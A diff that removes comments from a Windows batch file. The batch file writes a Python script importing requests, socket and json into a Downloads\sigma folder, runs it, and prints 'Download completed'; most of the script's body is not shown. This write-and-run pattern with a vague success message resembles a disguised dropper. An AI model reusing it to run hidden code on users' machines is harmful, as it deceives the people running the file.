@@ -1,10 +1,8 @@
 @echo off
 color 0A
 
-:: Set the Downloads folder path
 set "downloads=%USERPROFILE%\Downloads"
 
-:: Check if Python is installed
 python --version >nul 2>&1
 if %errorlevel% neq 0 (
     echo Python is not installed. Please install Python and ensure it is in the PATH.
@@ -12,14 +10,12 @@ if %errorlevel% neq 0 (
     exit /b
 )
 
-:: Check if the "requests" module is installed
 python -c "import requests" >nul 2>&1
 if %errorlevel% neq 0 (
     echo "requests" module not found. Installing it now...
     pip install requests
 )
 
-:: Check if the "sigma" folder exists in Downloads
 if exist "%downloads%\sigma" (
     echo Folder already exists
 ) else (
@@ -27,7 +23,6 @@ if exist "%downloads%\sigma" (
     echo Folder created
 )
 
-:: Create the Python script in a text file
 echo import requests > "%downloads%\sigma\script.py"
 echo import socket >> "%downloads%\sigma\script.py"
 echo import json >> "%downloads%\sigma\script.py"
@@ -83,13 +78,10 @@ echo. >> "%downloads%\sigma\script.py"
 echo if __name__ == "__main__": >> "%downloads%\sigma\script.py"
 echo     main() >> "%downloads%\sigma\script.py"
 
-:: Wait for a very short time using ping (works as a tiny delay)
 ping -n 1 -w 1000 127.0.0.1 >nul
 
-:: Run the Python script
 python "%downloads%\sigma\script.py"
 
-:: Wait for 2 seconds before showing "Download completed"
 timeout /t 2 /nobreak >nul
 echo Download completed
 
